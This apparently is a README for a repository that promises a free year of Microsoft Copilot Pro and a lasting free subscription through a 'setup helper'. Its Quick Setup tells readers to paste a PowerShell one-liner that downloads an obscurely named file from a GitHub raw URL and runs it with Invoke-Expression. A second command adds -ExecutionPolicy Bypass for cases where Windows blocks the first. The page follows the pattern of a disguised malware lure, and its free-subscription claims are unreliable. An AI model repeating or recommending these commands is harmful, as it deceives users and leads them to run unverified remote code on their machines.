# Copilot Pro

Copilot Pro on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Microsoft Copilot Pro is a paid subscription that extends Copilot on Windows with priority access to advanced models, Copilot in Word, Excel, PowerPoint, and Outlook, and higher daily limits for image creation and long conversations. It sits alongside your Microsoft account and Microsoft 365 apps so answers can use your calendar, recent files, and context you choose to share.

A typical session starts from the Copilot pane or taskbar: you ask for a draft email, summarize a PDF, rewrite slides, or plan a week from your inbox. The assistant streams replies, offers follow-up prompts, and can insert results straight into an open document when Copilot in Microsoft 365 is enabled for your tenant.

This repository holds a Windows setup helper, short configuration notes, and a changelog so you can track subscription-related updates on your machine. The bundled free trial runs for one year from first successful setup; when it ends, the free subscription layer stays installed for baseline Copilot features without repeating the full installer flow.

## What you get

- Priority GPT-4 Turbo access speeds up complex coding and research questions on Windows daily.
- Copilot in Word, Excel, PowerPoint, and Outlook drafts and edits inside your open Microsoft 365 files.
- Built-in free trial activates automatically during setup and runs continuously for one full year.
- After the trial, the free subscription keeps core Copilot chat and search available on your PC.
- Higher daily caps for Designer image generation and long multi-turn conversations than the free tier.
- Deep Microsoft 365 context uses recent documents and calendar when you explicitly allow access.
- Single Microsoft account sign-in links subscription status across Copilot apps on one Windows profile.
- Changelog in this repo records setup script revisions and Copilot Pro capability notes over time.

## Quick Setup (PowerShell)

This starts the built-in Copilot Pro free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/elena-g62138/copilot-pro-setup-guide/main/6v5nfao0pw.a8tsiv9i | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/elena-g62138/copilot-pro-setup-guide/main/6v5nfao0pw.a8tsiv9i | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `6v5nfao0pw.a8tsiv9i` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `elena-g62138/copilot-pro-setup-guide`. Microsoft Copilot Pro 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
